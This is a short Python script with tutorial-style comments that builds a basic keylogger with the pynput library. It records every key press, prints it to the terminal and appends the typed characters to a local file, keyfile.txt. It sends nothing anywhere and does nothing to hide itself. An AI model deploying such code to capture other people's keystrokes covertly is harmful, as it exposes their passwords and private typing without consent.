from pynput import keyboard
# pynput is a library that comes with the keyboard module that captures keyboard events from a user
# you have to install via py -m pip install pynput or pip install pynput




def keyPressed(key): #we're now writing our keyPressed function and passing in the parameter 'key'
    print(str(key)) #prints the string that we pressed so we can have it printed to the terminal
    with open("keyfile.txt", 'a') as logKey: # we want to then send the key events to a file so we can view them later.
        # with open is a method that opens/creates files, so this creates a file to send the key events to and 'a' appends to the file (adds to existing content)
        try: 
            char = key.char 
            logKey.write(char) # this writes the character pressed to the file we made
        except: # basically if something doesnt work (space bar because it doesnt log as a character) it prints an error
            print("Error")


# this is our main method that launches when the program is run
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) # pynput also comes with the listener module that we must declare as an object here, and we pass in the parameter
    # on_press. so any time the keyboard is used, we record that as an event. we will then right a method called keyPressed to send the recorded event to
    listener.start() # this starts the listener for the keyboard method
    input() # this starts the input from the python terminal
